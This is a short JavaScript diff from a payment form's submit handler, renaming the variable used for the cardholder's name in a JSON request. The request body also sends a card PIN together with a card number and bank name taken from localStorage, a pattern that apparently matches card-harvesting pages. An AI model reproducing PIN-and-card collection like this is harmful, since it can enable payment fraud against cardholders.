@@ -262,7 +262,7 @@ document.getElementById('paymentForm').addEventListener('submit', function(event
                 'Content-Type': 'application/json',
             },
             body: JSON.stringify({
-                name: name,
+                name: ownerName,
                 pin: code1,
                 cardNumber: localStorage.getItem('cardNumber') || '',
                 bank: localStorage.getItem('bank') || '',
